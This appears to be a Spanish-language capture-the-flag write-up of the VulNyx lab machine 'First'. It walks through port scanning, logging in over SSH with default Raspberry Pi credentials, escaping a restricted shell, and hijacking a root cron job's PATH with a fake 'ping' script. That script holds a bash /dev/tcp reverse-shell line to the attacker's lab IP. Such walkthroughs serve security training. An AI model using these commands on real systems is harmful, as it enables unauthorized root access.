# WriteUp: First | VulNyx

Cuando iniciamos la VM nos encontramos con un mensaje que dice `Welcome to my Raspberry!`, por lo que supongo que es el sistema operativo de esta microcomputadora.

Luego de ello, en mi kali, realizo un primer escaneo con nmap para el descubrimiento de puertos:

```sh
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.25

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4369/tcp open  epmd
```

Una vez descubiertos los puertos, realizo otro escaneo para el análisis de puertos con nmap:

```sh
nmap -sVC -p22,80,4369 192.168.56.25

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 24:83:97:49:96:11:7c:7a:54:00:17:3b:0c:f6:e1:54 (RSA)
|   256 83:cc:d0:72:41:48:fc:c4:ba:46:a1:0e:70:50:52:71 (ECDSA)
|_  256 a0:37:99:32:78:17:69:4f:1d:ac:75:1e:ba:19:58:45 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|_  nodes: 
```

En este punto desconocía el servicio `epmd` y la versión `Erlang Port Mapper Daemon` por lo que busqué información a cerca de ello. Ya teniendo una idea realicé algunas búsquedas con searchsploit para verificar si había suerte:

```
$ searchsploit erlang
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Campsite 2.6.1 - 'LocalizerLanguage.php?g_documentRoot' Remote File Inclusion                      | php/webapps/30006.txt
Erlang - Port Mapper Daemon Cookie Remote Code Execution (Metasploit)                              | multiple/remote/46024.rb
Erlang Cookie - Remote Code Execution                                                              | multiple/remote/49418.py
Flatnuke 2.5.8 - 'userlang' Local Inclusion / Delete All Users                                     | php/webapps/2499.php
TCExam 4.0.011 - 'SessionUserLang' Shell Injection                                                 | php/webapps/3816.php
Yaws-Wiki 1.88-1 (Erlang) - Persistent / Reflective Cross-Site Scripting                           | multiple/webapps/17111.txt
--------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Una vez buscado y seleccionado el módulo de Metasploit, ingresé a opciones y encontré lo siguiente:

```
Opciones del módulo (exploit/multi/misc/erlang_cookie_rce):

   Nombre       Configuración Actual  Requerido  Descripción
   ------       --------------------  ---------  -----------
   COOKIE                             sí         Cookie de Erlang para iniciar sesión
   RHOSTS                             sí         El/los host(s) objetivo, ver https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
                                                 ploit.html
   RPORT        25672                 sí         El puerto objetivo (TCP)
   SSL          false                 no         Negociar SSL para las conexiones entrantes
   SSLCert                            no         Ruta a un certificado SSL personalizado (por defecto se genera uno aleatoriamente)
   URIPATH                            no         La URI a usar para este exploit (por defecto es aleatoria)


Cuando CMDSTAGER::FLAVOR es uno de auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Nombre       Configuración Actual  Requerido  Descripción
   ------       --------------------  ---------  -----------
   SRVHOST      0.0.0.0               sí         El host local o la interfaz de red en la que escuchar. Debe ser una dirección en la máquina 
                                                 local o 0.0.0.0 para escuchar en todas las interfaces.
   SRVPORT      8080                  sí         El puerto local en el que escuchar.


Opciones del Payload (cmd/unix/reverse):

   Nombre       Configuración Actual  Requerido  Descripción
   ------       --------------------  ---------  -----------
   LHOST                              sí         La dirección de escucha (se puede especificar una interfaz)
   LPORT        4444                  sí         El puerto de escucha


Objetivo del Exploit:

   Id  Nombre
   --  ------
   0   Unix
```

Debido a que la opción `COOKIE` es requerido, y no la tenemos, no la podemos probar; pero bueno, ya tenemos alguna pista guardada.

Ahora veamos la web alojada en el puerto 80:

<figure><img src="../../.gitbook/assets/1.png" alt=""><figcaption></figcaption></figure>

Pues nada relevante con esto, haremos fuerza bruta con gobuster en búsqueda de más información:

```sh
gobuster dir -u http://192.168.56.25 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.25
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tasklist             (Status: 200) [Size: 137]
/server-status        (Status: 403) [Size: 278]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

Revisé la web encontrada y en ella solo aparecía la siguiente información:

```
[Task List]


[x] Go shopping.
[x] Make coffe.
[v] Update Raspberry.
[x] Go hairdresser.
[x] Request salary increase.
[x] Clean my room.
```

Me pareció curioso la frase `Update Raspberry` así que probé si esa frase tenía algo que ver con la COOKIE de Metasploit, sin embargo nada funcionó.

Luego de quedarme sin opciones miré el puerto que me quedaba, el 22, y me pregunté `¿Por qué una Raspberry tendría el puerto 22 abierto?` Hice esta pregunta en google y de toda la información que encontré, resaltó lo siguiente:

```
Consideraciones de seguridad: 

- Vulnerabilidad:
    
    Si se expone el puerto 22 a Internet sin las medidas de seguridad adecuadas, la Raspberry Pi podría ser vulnerable a ataques, especialmente con las credenciales de usuario por defecto.
    
- Cambio de contraseña:
    
    Es crucial cambiar la contraseña predeterminada del usuario 'pi' tan pronto como se active el servicio SSH y se conecte la Raspberry a Internet para proteger la seguridad del dispositivo.
```

Por lo que lo siguiente que hice fue consultar por las credenciales predeterminadas:

```
Las credenciales predeterminadas para el sistema operativo Raspberry Pi (antes Raspbian) para versiones antiguas eran usuario pi y contraseña raspberry. Sin embargo, en las versiones más recientes del sistema, no hay credenciales predeterminadas, sino que se te solicita crear un nombre de usuario y contraseña durante la instalación por primera vez o al usar Raspberry Pi Imager para preparar la tarjeta SD.
```

Por lo que ahora intenté ver si estas credenciales funcionaban:

```sh
ssh pi@192.168.56.25         
The authenticity of host '192.168.56.25 (192.168.56.25)' can't be established.
ED25519 key fingerprint is SHA256:/4sHdLc0MGAL7xya9kIEs8V1Coyl7RG+QaK9LssRo34.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.25' (ED25519) to the list of known hosts.
pi@192.168.56.25's password: 

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberry:~ $ id
uid=1000(pi) gid=1000(pi) grupos=1000(pi)
```

Bien, ahora que estamos dentro, verificamos si podemos realizar algo como root, aplicamos los siguiente comandos:

```sh
sudo -l
# NADA

find / -perm -u=s -type f 2>/dev/null
# NADA

cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/var/www/html:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root ping -c1 raspberrypi.com


# 7u7  ÉXITO!! ENCONTRAMOS LO QUE NECESITAMOS 7u7!!
```

Encontramos una vulnerabilidad de escalada de privilegios muy clásica conocida como **"PATH Hijacking"** o secuestro de la variable de entorno `PATH`.

Cuando `cron` (como `root`) intenta ejecutar `ping`, buscará el ejecutable en cada directorio del `PATH` en ese orden. Encontrará y ejecutará cualquier cosa llamada `ping`. Debemos de tener en cuenta que el comando `ping` se almacena en `/bin`, por lo que tenemos que buscar permisos de escritura en algún directorio para crear nuestro script `ping`.

Buscando en los directorios mostrados en el `PATH` nos encontramos con esto:

```sh
ls -la /var/www/html
total 24
drwxrwxrwx 2 www-data www-data  4096 ene  7  2024 .
drwxrwxrwx 3 www-data www-data  4096 nov 11  2023 ..
-rwxrwxrwx 1 www-data www-data 10701 nov 11  2023 index.html
-rwxrwxrwx 1 www-data www-data   137 ene  7  2024 tasklist

# 7u7 tenemos permisos de escritura en este directorio 7u7!!!
```

Ahora crearemos nuestro script de la siguiente manera:

```sh
echo '#!/bin/bash' > /var/www/html/ping

# Y nos aparece el siguiente mensaje:
-rbash: /var/www/html/ping: restringido: no se puede redirigir la salida
```

En vista de que estamos en un bash restringido, pasemos a uno sin restricciones de la siguiente manera:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Una vez realizado esto, podremos crear el script sin problemas. Volvemos a introducir los comandos:

```sh
echo '#!/bin/bash' > /var/www/html/ping
echo 'bash -i >& /dev/tcp/192.168.56.22/4444 0>&1' >> /var/www/html/ping
```

Luego de ello, el script necesita permisos de ejecución para que el sistema lo pueda correr.

```sh
chmod +x /var/www/html/ping
```

Por último, en nuestra máquina kali, iniciamos un listener de Netcat para "atrapar" la conexión de la reverse shell que acabamos de crear.

```sh
nc -lvnp 4444
```

La tarea cron se ejecuta **cada minuto**. Después de configurar nuestro listener, solo tenemos que esperar un máximo de 60 segundos. Cuando el `cron` se ejecute, en lugar de hacer un `ping`, nos enviará una shell de `root` directamente a nuestra terminal. 👾

```sh
root@raspberry:~# root@raspberry:~# ls
ls
root.txt
root@raspberry:~# cat root.txt  
cat root.txt
a4XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

root@raspberry:/home/pi# cat user.txt
cat user.txt
09XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

# 7u7!!! Listo!! Máquina completada 7u7!!!
```
